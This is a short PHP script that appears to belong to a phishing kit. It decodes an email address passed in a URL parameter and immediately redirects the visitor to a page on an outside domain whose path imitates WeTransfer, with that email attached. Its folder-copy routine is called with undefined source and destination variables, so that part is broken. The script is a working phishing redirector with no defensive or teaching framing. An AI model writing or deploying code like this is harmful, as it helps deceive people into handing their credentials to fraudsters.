<?php

$m = @$_GET["wt"];
$m = base64_decode($m);

$redirectedurl[1]="https://lifemogleyt.com/we--transfer/?email=".$m;;
$redirectedurl[2]="https://lifemogleyt.com/we--transfer/?email=".$m;;

$randomurl = rand(1, 2);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

recurse_copy( $src, $dst );

echo "<html><meta http-equiv='refresh' content='0;url=". $redirectedurl[$randomurl] ."' /><body>";
?>